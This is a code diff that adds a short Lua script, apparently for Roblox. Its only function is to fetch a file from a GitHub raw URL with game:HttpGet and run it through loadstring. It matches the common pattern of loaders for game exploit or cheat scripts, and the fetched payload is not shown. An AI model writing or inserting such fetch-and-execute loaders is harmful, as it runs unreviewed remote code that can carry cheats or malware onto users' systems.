@@ -1,0 +1,5 @@
+
+local url = 'https://raw.githubusercontent.com/Rayanitoo/centaura/refs/heads/main/pepe'
+
+local execute = loadstring(game:HttpGet(url))
+execute()
